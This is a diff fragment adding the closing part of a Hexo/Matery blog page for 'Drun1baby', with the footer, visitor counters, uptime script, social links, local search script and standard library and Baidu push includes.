+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2021-2022</span>
+            
+            <span id="year">2021</span>
+            <a href="/about" target="_blank">Drun1baby</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+                <span id="sitetime"> Loading ...</span>
+                <script>
+                    var calcSiteTime = function () {
+                        var seconds = 1000;
+                        var minutes = seconds * 60;
+                        var hours = minutes * 60;
+                        var days = hours * 24;
+                        var years = days * 365;
+                        var today = new Date();
+                        var startYear = "2021";
+                        var startMonth = "6";
+                        var startDate = "30";
+                        var startHour = "0";
+                        var startMinute = "0";
+                        var startSecond = "0";
+                        var todayYear = today.getFullYear();
+                        var todayMonth = today.getMonth() + 1;
+                        var todayDate = today.getDate();
+                        var todayHour = today.getHours();
+                        var todayMinute = today.getMinutes();
+                        var todaySecond = today.getSeconds();
+                        var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                        var diff = t2 - t1;
+                        var diffYears = Math.floor(diff / years);
+                        var diffDays = Math.floor((diff / days) - diffYears * 365);
+
+                        // 区分是否有年份.
+                        var language = 'zh-CN';
+                        if (startYear === String(todayYear)) {
+                            document.getElementById("year").innerHTML = todayYear;
+                            var daysTip = 'This site has been running for ' + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                daysTip = '本站已运行 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                daysTip = '本站已運行 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = daysTip;
+                        } else {
+                            document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                            var yearsAndDaysTip = 'This site has been running for ' + diffYears + ' years and '
+                                + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                yearsAndDaysTip = '本站已运行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                yearsAndDaysTip = '本站已運行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = yearsAndDaysTip;
+                        }
+                    }
+
+                    calcSiteTime();
+                </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/Drun1baby/Drun1baby.github.io" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:2717763591@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2717763591" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2717763591" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+    
+    <script type="text/javascript" size="150" alpha='0.6'
+        zIndex="-1" src="/libs/background/ribbon-refresh.min.js" async="async"></script>
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
